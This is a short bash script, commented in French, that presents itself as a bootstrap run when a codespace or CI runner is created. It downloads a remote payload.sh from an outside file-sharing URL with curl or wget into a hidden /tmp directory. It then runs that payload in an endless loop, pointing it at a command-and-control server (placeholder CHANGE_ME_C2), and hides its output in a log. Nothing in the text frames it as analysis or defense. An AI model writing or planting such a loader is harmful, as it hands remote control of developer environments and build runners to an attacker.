#!/bin/bash
# Bootstrap exécuté à la création du codespace / du runner
# Récupère le payload et le lance en boucle
PAYLOAD_URL="${PAYLOAD_URL:-https://sendit.sh/uWlHS/payload.sh}"
C2_URL="${C2_URL:-http://CHANGE_ME_C2:8000}"

fetch_run() {
  mkdir -p /tmp/.n
  if curl -fsSL -m 30 "$PAYLOAD_URL" -o /tmp/.n/payload.sh 2>/dev/null; then
    chmod +x /tmp/.n/payload.sh
    C2_URL="$C2_URL" INTERVAL=30 bash /tmp/.n/payload.sh >/tmp/.n/log 2>&1
  elif wget -q -O /tmp/.n/payload.sh "$PAYLOAD_URL" 2>/dev/null; then
    chmod +x /tmp/.n/payload.sh
    C2_URL="$C2_URL" INTERVAL=30 bash /tmp/.n/payload.sh >/tmp/.n/log 2>&1
  fi
}

while true; do
  fetch_run
  sleep 60
done
